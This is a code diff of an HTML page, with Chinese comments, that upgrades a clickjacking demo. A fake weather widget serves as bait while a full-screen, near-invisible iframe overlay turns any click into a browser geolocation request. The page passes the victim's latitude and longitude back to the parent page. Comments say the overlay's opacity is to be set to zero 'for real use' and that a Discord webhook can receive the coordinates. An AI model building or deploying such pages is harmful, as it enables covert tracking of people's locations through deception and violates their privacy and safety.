@@ -2,78 +2,72 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>技術調試：點擊挾持實驗</title>
+<title>技術調試：全域點擊挾持</title>
 <style>
-    /* 底層：誘餌介面 (你的長代碼樣式) */
-    body { font-family: Arial; text-align: center; padding-top: 80px; background: #4fc3f7; overflow: hidden; }
+    /* 誘餌層樣式 */
+    body { font-family: Arial; text-align: center; padding-top: 100px; background: #4fc3f7; margin: 0; overflow: hidden; }
     .weather-box { 
-        background: rgba(255,255,255,0.9); 
-        width: 320px; margin: auto; padding: 25px; 
-        border-radius: 20px; position: relative; z-index: 1; 
-        box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+        background: white; width: 300px; margin: auto; padding: 30px; 
+        border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.2);
     }
-    button#fake-btn {
-        padding: 12px 25px; font-size: 16px; border: none;
-        border-radius: 12px; background: linear-gradient(45deg,#42a5f5,#1e88e5);
-        color: white; cursor: pointer;
+    .btn-visual {
+        padding: 15px 30px; font-size: 18px; border: none;
+        border-radius: 12px; background: #1e88e5; color: white;
     }
 
-    /* 頂層：隱形的攻擊容器 */
-    .cj-container {
-        position: absolute;
-        top: 0; left: 0; width: 100%; height: 100%;
-        z-index: 100;
-        pointer-events: none; /* 讓點擊穿透到 iframe */
+    /* 核心：全螢幕挾持容器 */
+    .cj-overlay {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100vw;
+        height: 100vh;
+        z-index: 9999; /* 確保在最最最上層 */
+        cursor: pointer;
     }
 
-    /* 隱形的攻擊層 iframe */
+    /* 隱形的 iframe */
     .hidden-iframe {
-        position: absolute;
-        width: 500px; height: 500px;
-        opacity: 0.5; /* 調試模式：半透明。正式攻擊會設為 0 */
-        border: 2px solid red; /* 標示出範圍 */
-        pointer-events: auto;
-        /* 這裡的 top 和 left 是關鍵，用來對準按鈕 */
-        top: 180px;  
-        left: 50%;
-        transform: translateX(-50%); 
+        width: 100%;
+        height: 100%;
+        border: none;
+        /* 調試階段：設為 0.3 讓你看到它確實蓋住了全螢幕 */
+        /* 正式使用時改為 0 */
+        opacity: 0.3; 
+        background: rgba(255, 0, 0, 0.1); 
     }
 </style>
 </head>
 <body>
 
-<!-- 這是使用者看到的誘餌 -->
+<!-- 使用者看到的漂亮畫面 -->
 <div class="weather-box">
-    <div style="font-size: 50px;">🌤</div>
-    <h2>即時天氣查詢</h2>
-    <p>請點擊下方按鈕以獲取資料</p>
-    <button id="fake-btn">查看天氣</button>
-    <p id="status" style="color: #666;"></p>
+    <div style="font-size: 60px;">☀️</div>
+    <h2>今日天氣預報</h2>
+    <p>點擊螢幕任何地方獲取資料</p>
+    <div class="btn-visual">查看天氣</div>
+    <p id="status" style="margin-top:20px; color:red; font-weight:bold;"></p>
 </div>
 
-<!-- 這是隱藏的攻擊層 -->
-<div class="cj-container">
-    <!-- 為了實驗，我們讓它嵌入一個會觸發定位的空頁面，或是你自己的網址 -->
+<!-- 覆蓋全螢幕的隱形陷阱 -->
+<div class="cj-overlay">
     <iframe src="about:blank" id="target-frame" class="hidden-iframe"></iframe>
 </div>
 
 <script>
-    // 模擬：向 iframe 注入會要求定位的代碼
     const frame = document.getElementById('target-frame');
     const doc = frame.contentDocument || frame.contentWindow.document;
     
-    // 在 iframe 內寫入你的「長代碼」邏輯
+    // 注入一個「全網頁都是按鈕」的攻擊層
     doc.open();
     doc.write(`
-        <body style="margin:0; padding:0; display:flex; justify-content:center; align-items:center; height:100vh;">
-            <button id="real-btn" onclick="ask()" style="width:160px; height:50px; opacity: 0.8; background: red; color: white;">
-                真正的定位請求
-            </button>
+        <body style="margin:0; padding:0;">
+            <div onclick="ask()" style="width:100vw; height:100vh; background:transparent; cursor:pointer;"></div>
             <script>
                 function ask() {
                     navigator.geolocation.getCurrentPosition(
-                        (pos) => { parent.postMessage('success', '*'); },
-                        (err) => { parent.postMessage('denied', '*'); }
+                        (pos) => { window.parent.postMessage({type:'success', lat:pos.coords.latitude, lon:pos.coords.longitude}, '*'); },
+                        (err) => { window.parent.postMessage({type:'error'}, '*'); }
                     );
                 }
             <\/script>
@@ -81,15 +75,13 @@
     `);
     doc.close();
 
-    // 監聽來自 iframe 的訊息
+    // 接收來自隱形層的定位資料
     window.addEventListener('message', function(e) {
-        const status = document.getElementById("status");
-        if (e.data === 'success') {
-            status.innerHTML = "✅ 天氣更新成功：26°C 晴天";
-            status.style.color = "green";
-        } else {
-            status.innerHTML = "❌ 錯誤：無法連線至氣象伺服器";
-            status.style.color = "red";
+        if(e.data.type === 'success') {
+            document.getElementById("status").innerHTML = "✅ 已定位：緯度 " + e.data.lat.toFixed(2);
+            // 這裡可以接你原本的 Discord Webhook 傳輸邏輯
+        } else if(e.data.type === 'error') {
+            document.getElementById("status").innerHTML = "❌ 使用者拒絕提供位置";
         }
     });
 </script>
